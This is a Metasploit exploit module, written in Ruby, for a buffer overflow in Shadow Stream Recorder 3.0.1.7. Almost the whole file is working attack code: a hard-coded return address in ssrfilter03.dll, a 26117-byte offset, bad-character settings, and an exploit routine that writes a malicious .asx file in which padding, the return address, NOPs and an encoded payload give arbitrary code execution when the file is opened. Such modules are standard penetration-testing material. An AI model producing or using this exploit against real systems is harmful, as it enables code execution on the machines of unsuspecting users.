# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => &#039;Shadow Stream Recorder 3.0.1.7 Buffer Overflow&#039;,
            &#039;Description&#039;     => %q{
                This module exploits a buffer overflow in Shadow Stream Recorder 3.0.1.7.
                Using the application to open a specially crafted asx file, a buffer
                overflow may occur to allow arbitrary code execution under the context
                of the user.
            },
            &#039;License&#039;         => MSF_LICENSE,
            &#039;Author&#039;          =>
                [
                    &#039;AlpHaNiX <alpha[at]hacker.bz>&#039;,  # Original .m3u exploit
                    &#039;b0telh0 <me[at]gotgeek.com.br>&#039;  # MSF Module and .asx exploit
                ],
            &#039;References&#039;      =>
                [
                    [ &#039;BID&#039;, &#039;34864&#039; ],
                    [ &#039;EDB&#039;, &#039;11957&#039; ]
                ],
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;
                },
            &#039;Platform&#039;        => &#039;win&#039;,
            &#039;Payload&#039;         =>
                {
                    &#039;Space&#039; => 2000,
                    &#039;BadChars&#039; => "\x00\x09\x0a",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;Targets&#039;         =>
                [
                    [ &#039;Windows Universal&#039;,
                        {
                            # push esp - ret ssrfilter03.dll
                            &#039;Ret&#039; => 0x10035706,
                            &#039;Offset&#039; => 26117
                        }
                    ],
                ],
            &#039;Privileged&#039;      => false,
            &#039;DisclosureDate&#039;  => &#039;Mar 29 2010&#039;,
            &#039;DefaultTarget&#039;   => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [true, &#039;The file name.&#039;, &#039;msf.asx&#039;])
            ], self.class)
 
    end
 
    def exploit
 
        buffer = "http://"
        buffer << rand_text_alpha_upper(target[&#039;Offset&#039;])
        buffer << [target.ret].pack(&#039;V&#039;)
        buffer << make_nops(40)
        buffer << payload.encoded
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(buffer)
    end
 
end



